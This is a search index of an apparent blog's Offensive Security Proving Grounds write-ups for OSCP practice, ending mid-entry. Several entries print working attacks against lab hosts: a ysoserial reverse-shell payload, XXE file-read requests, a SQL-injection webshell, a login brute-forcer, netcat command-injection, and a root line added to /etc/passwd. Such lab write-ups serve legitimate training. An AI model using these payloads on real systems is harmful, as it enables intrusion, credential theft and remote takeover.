[ { "title": "Cassios Box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/new-post/", "categories": "New, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, smb, misc, java deserialization, privilege escalation, sudo, linux", "date": "2022-06-15 10:33:00 +0000", "snippet": "Testing new post" }, { "title": "Cassios Box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-cassios/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, smb, misc, java deserialization, privilege escalation, sudo, linux", "date": "2022-04-10 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called Cassios, you can find a PDF version of this Writeup here.Enumeration:Nmap: ○ nmap -sC -sV -Pn -oN nmap 192.168.192.116Nmap scan report for cassios.pg (192.168.192.116)Host is up (0.080s latency).Not shown: 995 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 36:cd:06:f8:11:72:6b:29:d8:d8:86:99:00:6b:1d:3a (RSA)| 256 7d:12:27:de:dd:4e:8e:88:48:ef:e3:e0:b2:13:42:a1 (ECDSA)|_ 256 c4:db:d3:61:af:85:95:0e:59:77:c5:9e:07:0b:2f:74 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS))|_http-title: Landed by HTML5 UP| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.6 (CentOS)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)445/tcp open netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)8080/tcp open http-proxy SMB Enumeration using smbclient: ○ smbclient -N -L //cassios.pg/Anonymous login successful Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Samantha Konstan Disk Backups and Recycler files IPC$ IPC IPC Service (Samba 4.10.4)Reconnecting with SMB1 for workgroup listing.Anonymous login successful Server Comment --------- ------- Workgroup Master --------- ------- Exploring Samantha Konstan Share: Download all the files from smb using smbget:smbget -U anonymous -R &#39;smb://cassios.pg/Samantha Konstan&#39; Running ffuf against the web application on port 80:which gives us backup_migrate directory like shown below Download and extract the data from recycler.tar, The User and Password can be found in WebSecurityConfig.java file: @Bean @Override public UserDetailsService userDetailsService() { UserDetails user = User.withDefaultPasswordEncoder() .username(&quot;recycler&quot;) .password(&quot;DoNotMessWithTheRecycler123&quot;) .roles(&quot;USER&quot;) .build(); return new InMemoryUserDetailsManager(user); } Login to the web application on port 8080 using the Creds: User: recycler Pass: DoNotMessWithTheRecycler123 By reading the source code of src/main/java/com/industrial/recycler/DashboardController.java (after extracting recycler.tar file), and even that I have never wrote a code in java but I noticed that the application takes data from this file /home/samantha/backups/recycler.ser which we have controle over it via SMB: The other thing that we can notice from the source code is the application uses readObject() to handle that data from recycler.ser file, and the readObject() method is vulnerable to java deserialization which leads to Remte Command Execution on the target.Getting RCE: I used a bash reverse shell payload, and encoded it with base64 encode. I used Ysoserial which you can download from here to generate a payload as shown below, change the base64 data with your encoded payload, here is some resources that helped me for the exploit:java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjE5Mi8yOTk1NSAwPiYxCg==}|{base64,-d}|{bash,-i}&quot; &amp;gt; recycler.ser upload the output file which is recycler.ser to the SMB server: visit http://cassios.pg:8080/dashboard and hit Check Status button: Check your Netcat Listener:We got RCE as user: samantha.Privilege EscalationEnumerationBy running sudo -l it shows that we can run sudoedit as root without a password:[samantha@cassios ~]$ sudo -lMatching Defaults entries for samantha on cassios: env_keep+=&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;, env_keep+=&quot;QTDIR KDEDIR&quot;User samantha may run the following commands on cassios: (root) NOPASSWD: sudoedit /home/*/*/recycler.ser I found that exploit available here Create a password for the new user: openssl passwd -1 -salt bingo pwned , where bingo is the username and pwned is the password Let’s use sudoedit to edit /etc/passwd file and get root: The line I added to /etc/passwd is: bingo:$1$bingo$3hsGN5T46YggQbdjWYZ9o0:0:0:baam:/root:/bin/bash User: bingo Pass: pwned Happy Hacking!" }, { "title": "Depreciated Box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-depreciated/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, graphql, misc, privilege escalation, linux", "date": "2022-04-06 11:33:00 +0000", "snippet": "Hello,Depreciated is a Medium box on Proving grounds, I first solved this box in January this year, you can find a PDF version of this blog here on Github: https://github.com/bing0o/Write-ups/blob/main/Depreciated-PG-Practice.pdfEnumeration:Nmap: ○ nmap -p- -vvv -T4 --open -Pn -oN nmap-all depreciated.pg# Nmap 7.92 scan initiated Wed Jan 12 01:12:47 2022 as: nmap -p- -vvv -T4 --open -Pn -oN nmap-all depreciated.pgNmap scan report for depreciated.pg (192.168.192.170)Host is up, received user-set (0.090s latency).Scanned at 2022-01-12 01:12:47 CET for 112sNot shown: 62159 closed tcp ports (conn-refused), 3372 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON22/tcp open ssh syn-ack80/tcp open http syn-ack5132/tcp open unknown syn-ack8433/tcp open unknown syn-ackRead data files from: /usr/bin/../share/nmap# Nmap done at Wed Jan 12 01:14:39 2022 -- 1 IP address (1 host up) scanned in 112.32 seconds Port 22 SSH. Port 80 HTTP Server. Port 5132 CLI Messaging Application. Port 8433 Werkzeug httpd 2.0.2 (Python 3.8.10).Exploring Open Ports Access port 80 and by reading the source code, it shows that there’s a Graphql application running on port 8433: Checking on port 5132:it looks like we need a username and an OTP (One Time Password) to login, we will get back to that later. Checking on port 8433, we already know that we have /graphql on that port:Getting OTP for User peter Let’s Do Some Enumeration on graphql: Request: {listUsers} Response: {&quot;data&quot;: { &quot;listUsers&quot;: &quot;[&#39;peter&#39;, &#39;jason&#39;]&quot;}} Request: {getOTP(username:&quot;peter&quot;)} Response: {&quot;data&quot;: { &quot;getOTP&quot;: &quot;Your One Time Password is: G8DSr9HGV9AW5lCg&quot;}} Now we have an OTP for the user peter: G8DSr9HGV9AW5lCgExploring CLI Messaging Application Let’s try the User and OTP that we have on port 5132:and we are in :D the application allows you to list and read some messages, Let’s explore it: We Can’t read most of the messages, but It looks like there’s one we could read which reveals a password for the user peter, let’s try to ssh:Privilege Escalation:Enumeration Linpeas didn’t give me much Information only that Graphql application on port 8433 is running by root:Reading The Source Code Taking a look at the source code which we found on /opt/depreciated/.All the functions seems useless only this one:def create_message(user): for_ = input(&quot;for: &quot;) description = input(&quot;Description: &quot;) num = random.randint(1000, 9999) author = user attachment = input(&quot;File: &quot;) if attachment and attachment != &quot;none&quot; and os.path.exists(attachment): with open(attachment, &#39;r&#39;) as f: data = f.read() basename = &#39;/opt/depreciated/&#39; + os.path.basename(attachment) with open(basename, &#39;w&#39;) as f: f.write(data) else: attachment = &quot;none&quot; msg_info = {&#39;id&#39;: num, &#39;author&#39;: author, &#39;description&#39;: description, &#39;for&#39;: for_, &#39;attachment&#39;: attachment} MESSAGES.append(msg_info) with open(&quot;/opt/depreciated/messaging/msg.json&quot;, &#39;w&#39;) as f: json.dump(MESSAGES, f)which allows you to add an attachment file from the system to your message, and the application write the attachments to /opt/depreciated/&amp;lt;FILE_NAME&amp;gt;, this means if we attache /etc/shadow to a message, we will be able to access the shadow file at /opt/depreciated/shadow and its gonna be readable.Getting rootAt first I tried to read /root/proof.txt file and it worked: The Result: Another thing come to my mind is that there’s some messages we couldn’t read before on port 5132, let’s try and read them: The Result: Switch user to root using that password:Happy Hacking!" }, { "title": "Muddy Box on OffSec Proving Grounds - OSCP Preparation.", "url": "/posts/pg-muddy/", "categories": "OSCP, Proving Grounds", "tags": "oscp easy box, PG easy box, enumeration, webdav, misc, privilege escalation, cronjob, relative path", "date": "2022-01-21 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called Muddy and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap:○ nmap -sC -sV -Pn -oN nmap 192.168.151.161 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 13:44 CETNmap scan report for 192.168.151.161Host is up (0.15s latency).Not shown: 993 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)| 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)|_ 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)25/tcp open smtp Exim smtpd| smtp-commands: muddy Hello nmap.scanme.org [192.168.49.151], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Did not follow redirect to http://muddy.ugc/111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind|_ 100000 3,4 111/udp6 rpcbind443/tcp open tcpwrapped808/tcp open tcpwrapped8888/tcp open http WSGIServer 0.1 (Python 2.7.16)|_http-server-header: WSGIServer/0.1 Python/2.7.16|_http-title: Ladon Service CatalogService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 182.33 seconds Running ffuf against port 80: Directory: /webdav, Status: 401 Port 8888 is running Ladon Service: Searchsploit: ○ searchsploit Ladon -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Ladon Framework for Python 0.9.40 - XML External Entity Expansion | xml/webapps/43113.txt-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results Exploit (curl command):$ curl -s -X $&#39;POST&#39; \\ -H $&#39;Content-Type: text/xml;charset=UTF-8&#39; \\-H $&#39;SOAPAction: \\&quot;http://muddy.ugc:8888/muddy/soap11/checkout\\&quot;&#39; \\--data-binary $&#39;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&amp;lt;!DOCTYPE uid[&amp;lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;]&amp;gt;&amp;lt;soapenv:Envelope xmlns:xsi=\\&quot;http://www.w3.org/2001/XMLSchema-instance\\&quot;xmlns:xsd=\\&quot;http://www.w3.org/2001/XMLSchema\\&quot;xmlns:soapenv=\\&quot;http://schemas.xmlsoap.org/soap/envelope/\\&quot;xmlns:urn=\\&quot;urn:HelloService\\&quot;&amp;gt;&amp;lt;soapenv:Header/&amp;gt;&amp;lt;soapenv:Body&amp;gt;&amp;lt;urn:checkout soapenv:encodingStyle=\\&quot;http://schemas.xmlsoap.org/soap/encoding/\\&quot;&amp;gt;&amp;lt;uid xsi:type=\\&quot;xsd:string\\&quot;&amp;gt;&amp;amp;passwd;&amp;lt;/uid&amp;gt;&amp;lt;/urn:checkout&amp;gt;&amp;lt;/soapenv:Body&amp;gt;&amp;lt;/soapenv:Envelope&amp;gt;&#39; \\&#39;http://muddy.ugc:8888/muddy/soap11&#39; | xmllint --format - The exploit will read the /etc/passwd file on the target.The Response:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;SOAP-ENV:Envelope xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns=&quot;urn:muddy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&amp;gt; &amp;lt;SOAP-ENV:Body SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&amp;gt; &amp;lt;ns:checkoutResponse&amp;gt; &amp;lt;result&amp;gt;Serial number: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/falseian:x:1000:1000::/home/ian:/bin/shDebian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin_rpc:x:108:65534::/run/rpcbind:/usr/sbin/nologinstatd:x:109:65534::/var/lib/nfs:/usr/sbin/nologin&amp;lt;/result&amp;gt; &amp;lt;/ns:checkoutResponse&amp;gt; &amp;lt;/SOAP-ENV:Body&amp;gt;&amp;lt;/SOAP-ENV:Envelope&amp;gt; Since we have a /webdav directory on port 80 let’s try and read some files from it.The webdav password file can be found on: /var/www/html/webdav/passwd.dav:○ curl -s -X $&#39;POST&#39; \\ -H $&#39;Content-Type: text/xml;charset=UTF-8&#39; \\-H $&#39;SOAPAction: \\&quot;http://muddy.ugc:8888/muddy/soap11/checkout\\&quot;&#39; \\--data-binary $&#39;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&amp;lt;!DOCTYPE uid[&amp;lt;!ENTITY passwd SYSTEM &quot;file:///var/www/html/webdav/passwd.dav&quot;&amp;gt;]&amp;gt;&amp;lt;soapenv:Envelope xmlns:xsi=\\&quot;http://www.w3.org/2001/XMLSchema-instance\\&quot;xmlns:xsd=\\&quot;http://www.w3.org/2001/XMLSchema\\&quot;xmlns:soapenv=\\&quot;http://schemas.xmlsoap.org/soap/envelope/\\&quot;xmlns:urn=\\&quot;urn:HelloService\\&quot;&amp;gt;&amp;lt;soapenv:Header/&amp;gt;&amp;lt;soapenv:Body&amp;gt;&amp;lt;urn:checkout soapenv:encodingStyle=\\&quot;http://schemas.xmlsoap.org/soap/encoding/\\&quot;&amp;gt;&amp;lt;uid xsi:type=\\&quot;xsd:string\\&quot;&amp;gt;&amp;amp;passwd;&amp;lt;/uid&amp;gt;&amp;lt;/urn:checkout&amp;gt;&amp;lt;/soapenv:Body&amp;gt;&amp;lt;/soapenv:Envelope&amp;gt;&#39; \\&#39;http://muddy.ugc:8888/muddy/soap11&#39; | grep -iPo &#39;(?&amp;lt;=&amp;lt;result&amp;gt;)(.*)(?=&amp;lt;/result&amp;gt;)&#39;Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0 The Content of passwd.dav is: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0 Cracking the hash using john:○ cat hash.txt $apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0○ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])Will run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statussleepless (?) 1g 0:00:00:00 DONE (2022-01-05 15:09) 1.612g/s 113032p/s 113032c/s 113032C/s softball30..ramaramaUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. Creds: User: administrant Pass: sleepless Upload a webshell to webdav using curl command:○ curl -XPUT -d @shell.php http://muddy.ugc/webdav/shell.php -u &#39;administrant:sleepless&#39; RCE:Privilege Escalation: LinPEAS:Exploit linux relative path: Generate a Payload and Starting a local netcat listener: Create an executable file named netstat at /dev/shm with the content of our payload: We got a reverse shell connection as root:Happy Hacking!" }, { "title": "Iterface Easy box on OffSec Proving Grounds - OSCP Preparation.", "url": "/posts/pg-interface/", "categories": "OSCP, Proving Grounds", "tags": "oscp easy box, PG easy box, enumeration, API, rce, linux", "date": "2022-01-21 09:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called Interface and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: port 80 is running a node.js app We can get the full list of users from: http://interface.pg/api/users. Running ffuf on http://interface.pg/api/ gives us some other endpoints: /backup , Status code: 401 /settings, Status code: 401 bruteforce the login page with this script (you can use hydra or other tools for that!):#!/usr/bin/env pythonfrom concurrent.futures import ThreadPoolExecutor as executorimport requests,sysheaders = {&quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Host&quot;: &quot;interface.pg&quot;}def printer(url): sys.stdout.write(url+&quot; \\r&quot;) sys.stdout.flush() return True#@snoopdef Login(USERNAME, PASSWORD): printer(&quot;Trying: &quot;+USERNAME+&quot;:&quot;+PASSWORD) data = {&quot;username&quot;:&quot;USERNAME&quot;, &quot;password&quot;:&quot;PASSWORD&quot;} data[&#39;username&#39;] = USERNAME data[&#39;password&#39;] = PASSWORD req = requests.post(&quot;http://interface.pg/login&quot;, json=data, headers=headers) if req.status_code != 401: print(str(req.status_code)+&quot; | Creds&amp;gt; &quot;+USERNAME+&quot;:&quot;+PASSWORD) print(&#39;\\n&#39;) exit(0)users = open(&#39;users.txt&#39;, &#39;r&#39;)for user in users: USERNAME = user.strip(&#39;\\n&#39;) passwds = open(&#39;/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt&#39;, &#39;r&#39;) with executor(max_workers=20) as exe: [exe.submit(Login, USERNAME, passwd.strip(&#39;\\n&#39;)) for passwd in passwds] We got a valid Credentials: User: dev-acct Pass: password Now we can access /api/settings endpoint: if you take a look at the response from the picture above you will notice that &quot;admin&quot;:false looks juicy, let’s try to get admin access: Now since we have admin privilege, we can access /api/backup endpoint. Command Injection: apparently the application takes a filename and create a backup, let’s try and exploit that: Checking the RCE with this payload: ; ping -c 3 MY_IP_ADDRESS; I got the ping hits on my local machine which confirms the RCE: I used a bash reverse shell payload to get a shell as root: Happy Hacking!" }, { "title": "Hawat Easy box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-hawat/", "categories": "OSCP, Proving Grounds", "tags": "oscp easy box, PG easy box, enumeration, SQL Injection, linux", "date": "2022-01-04 09:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called Hawat and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: ○ nmap -p- -T4 -vvv -Pn -oN nmap-all --max-retries 1 192.168.249.147 # Nmap 7.92 scan initiated Mon Jan 3 15:35:07 2022 as: nmap -p- -T4 -vvv -Pn -oN nmap-all --max-retries 1 192.168.249.147Increasing send delay for 192.168.249.147 from 0 to 5 due to 11 out of 19 dropped probes since last increase.Warning: 192.168.249.147 giving up on port because retransmission cap hit (1).Nmap scan report for hawat.pg (192.168.249.147)Host is up, received user-set (0.15s latency).Scanned at 2022-01-03 15:35:07 CET for 867sNot shown: 65519 filtered tcp ports (no-response)PORT STATE SERVICE REASON22/tcp open ssh syn-ack17445/tcp open unknown syn-ack30455/tcp open unknown syn-ack50080/tcp open unknown syn-ackRead data files from: /usr/bin/../share/nmap# Nmap done at Mon Jan 3 15:49:34 2022 -- 1 IP address (1 host up) scanned in 867.42 seconds Port 22 SSH. Port 17445 is an issue tracker web application: Port 30455 is Running a web Server, Using gobuster against that port gives us phpinfo.php file: Port 50080 is Running Web Server, gobuster finds /cloud directory which is a nextcloud web application: Login with admin:admin to nextcloud at http://hawat.pg:50080/cloud/. Download issuetracker.zip file: After some source code analysis, we discover an SQL Injection vulnerability, which effects the issuetracker application on port 17445 at this endpoint http://192.168.96.147:17445/issue/checkByPriority via priority parameter: Exploit SQL Injection and Write a shell on the server: we have a phpinfo.php file on http://hawat.pg:30455/phpinfo.php and it shows the root directory of the web server: Write a PHP web shell on the server using SQL Injection, You have to Create an account first, then login to the issuetracker application to exploit it, urlencode the bellow payload and inject it in priority parameter at http://192.168.96.147:17445/issue/checkByPriority?priority=EXPLOIT : Exploit: &#39; union select &#39;&amp;lt;?php echo system($_REQUEST[&quot;bingo&quot;]); ?&amp;gt;&#39; into outfile &#39;/srv/http/cmd.php&#39; -- - Access the shell:Happy Hacking!" }, { "title": "Exfiltrated Easy box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/exfiltrated/", "categories": "OSCP, Proving Grounds", "tags": "oscp easy box, PG easy box, enumeration, cms, cve, privilege escalation, cron, linux", "date": "2022-01-03 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Easy machines which called Exfiltrated and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Port 80 is running Subrion CMS version 4.2.1 as shown in the /panel: We can login with admin:admin to the CMS. Using Searchsploit to look for exploits: Exploit:Privilege Escalation: Running LinPEAS:As shown in the picture above there’s a cronjob running this script /opt/image-exif.sh every minute as root, and this is the content of the script:#! /bin/bash#07/06/18 A BASH script to collect EXIF metadata echo -ne &quot;\\\\n metadata directory cleaned! \\\\n\\\\n&quot;IMAGES=&#39;/var/www/html/subrion/uploads&#39;META=&#39;/opt/metadata&#39;FILE=`openssl rand -hex 5`LOGFILE=&quot;$META/$FILE&quot;echo -ne &quot;\\\\n Processing EXIF metadata now... \\\\n\\\\n&quot;ls $IMAGES | grep &quot;jpg&quot; | while read filename; do exiftool &quot;$IMAGES/$filename&quot; &amp;gt;&amp;gt; $LOGFILE doneecho -ne &quot;\\\\n\\\\n Processing is finished! \\\\n\\\\n\\\\n&quot; it runs exiftool against every jpg file on this directory /var/www/html/subrion/uploads, let’s exploit that:I used this script to create the exploit: https://github.com/OneSecCyber/JPEG_RCE . Generate a payload: Inject the payload into a jpg file: Upload the runme.jpg file to the remote target on /var/www/html/subrion/uploads directory and wait a minute: Happy Hacking!" }, { "title": "ClamAV Easy box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-clamav/", "categories": "OSCP, Proving Grounds", "tags": "oscp easy box, PG easy box, enumeration, clamav, reverse shell, linux", "date": "2022-01-03 09:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Easy machines which called ClamAV and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Using Searchsploit to search for clamav: Exploit: Getting Bind Shell as root on port 31337: Happy Hacking!" }, { "title": "Pwned1 Medium box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-pwned1/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, ftp, misc, privilege escalation, docker, linux", "date": "2021-12-22 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called Pwned1 and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Reading /robots.txt: We got a list of possible paths on the server on /hidden_text/secret.dic Running gobuster using that list: Checking the source code of that page: we have a user and password: ftpuser:B0ss_Pr!ncesS: Login to ftp: Downloading id_rsa and notes.txt files to our local machine: Getting Shell through SSH: Privilege Escalation: Enumeration: sudo -l: we can run /home/messenger.sh script as selena without password. Reading /home/messenger.sh file: Getting shell as selena user:sudo -u selena /home/messenger.sh As you can see in the screenshot above, we are a part of docker group, so let’s exploit that:docker run -v /:/mnt -it alpineHappy Hacking!" }, { "title": "NoName Medium box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-noname/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, rce, misc, privilege escalation, suid, linux", "date": "2021-12-22 09:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called NoName and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap:Getting RCE: We can ping IPs on that page: http://noname.pg/superadmin.php Not all the commands we try to run actually get executed on the target like ls: But we can list the files on the current directory using echo *: Reading the source code of superadmin.php file:&amp;lt;?php if (isset($_POST[&#39;submitt&#39;])){ $word=array(&quot;;&quot;,&quot;&amp;amp;&amp;amp;&quot;,&quot;/&quot;,&quot;bin&quot;,&quot;&amp;amp;&quot;,&quot; &amp;amp;&amp;amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;); $pinged=$_POST[&#39;pinger&#39;]; $newStr = str_replace($word, &quot;&quot;, $pinged); if(strcmp($pinged, $newStr) == 0) { $flag=1; } else { $flag=0; }}if ($flag==1){$outer=shell_exec(&quot;ping -c 3 $pinged&quot;);echo &quot;&amp;lt;pre&amp;gt;$outer&amp;lt;/pre&amp;gt;&quot;;}?&amp;gt; As you can see there’s a blacklist commands that we can’t use: &quot;;&quot;,&quot;&amp;amp;&amp;amp;&quot;,&quot;/&quot;,&quot;bin&quot;,&quot;&amp;amp;&quot;,&quot; &amp;amp;&amp;amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot; Let’s get a shell: Create a local file with a payload to be executed on the target, then passing that file to a netcat listener: Connecting to our netcat from the remote target and passing the output to bash: The payload: ||netcat 192.168.49.137 9090|`which bash` We Got a shell: Privilege Escalation: LinEnum: Exploit:Happy Hacking!" }, { "title": "My-CMSMS Medium box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-mycmsms/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, mysql, misc, privilege escalation, sudo, linux", "date": "2021-12-21 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called My-CMSMS and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Login to the remote mysql using root:root: Exploring cmsms_db Database: MySQL [cmsms_db]&amp;gt; show tables;+--------------------------------+| Tables_in_cmsms_db |+--------------------------------+| cms_additional_users |...| cms_users || cms_users_seq || cms_version |+--------------------------------+53 rows in set (0.328 sec) Updating the admin password: I couldn’t crack the MD5 hash, so let’s just try to update the password to something we already know, I found this blog post and it shows the MySQL query to update the password: Executing MySQL Query: This query will update the admin password to admin: update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#39;sitemask&#39;),&#39;&#39;),&#39;admin&#39;))) where username = &#39;admin&#39;; Getting RCE: Generating bash reverse shell payload and starting a Netcat Listener: Injecting bash payload to the application: hit the submit button, then open the shell: Hit Run: We got RCE:Privilege Escalation: LinEnum: Decoding: Creds: User: armour Pass: Shield@123 Getting root:Happy Hacking!" }, { "title": "Loly Medium box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-loly/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, wordpress, misc, privilege escalation, kernel, linux", "date": "2021-12-20 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called Loly and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Using wpscan against wordpress running on port 80: wpscan --rua --url http://loly.lc/wordpress/ -P /usr/share/wordlists/rockyou.txt We found a valid Credentials for wordpress:Getting Shell: First lets make a shell and zip it: Uploading the shell: Access the shell: We got RCE: Privilege Escalation: Creds on wp-config.php file:/** MySQL database username */define( &#39;DB_USER&#39;, &#39;wordpress&#39; );/** MySQL database password */define( &#39;DB_PASSWORD&#39;, &#39;lolyisabeautifulgirl&#39; ); Switching to loly user using the password that we found on wp-config.php file:Kernel Exploit: Enumeration: The Exploit: https://packetstormsecurity.com/files/148517/Linux-Kernel-Local-Privilege-Escalation.html Getting root:Happy Hacking!" }, { "title": "HAwordy Medium box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-hawordy/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, wordpress, misc, privilege escalation, suid, linux", "date": "2021-12-18 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called HAwordy and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Using wpscan against wordpress running on port 80, path /wordpress: The Exploit: phtml file to upload: RCE:Privilege Escalation: the wget binary on the system has the SUID bit: we can add our root user to 